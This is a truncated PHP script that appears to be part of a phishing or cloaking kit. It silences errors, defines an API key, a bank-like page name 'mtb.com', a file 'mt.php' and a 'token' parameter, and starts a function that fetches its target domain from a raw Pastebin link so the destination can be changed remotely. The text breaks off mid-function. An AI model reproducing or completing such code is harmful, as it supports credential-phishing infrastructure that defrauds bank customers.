<?php
error_reporting(0);
define("APIKEY","API-KEY-t7af-zrs7-vyb5lfrdg85i");
define("Page","mtb.com");
define("FILE_NAME","mt.php");
define("GET_PARAM","token");
function getdomain(){
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pastebin.com/raw/YZ7f0FyW');
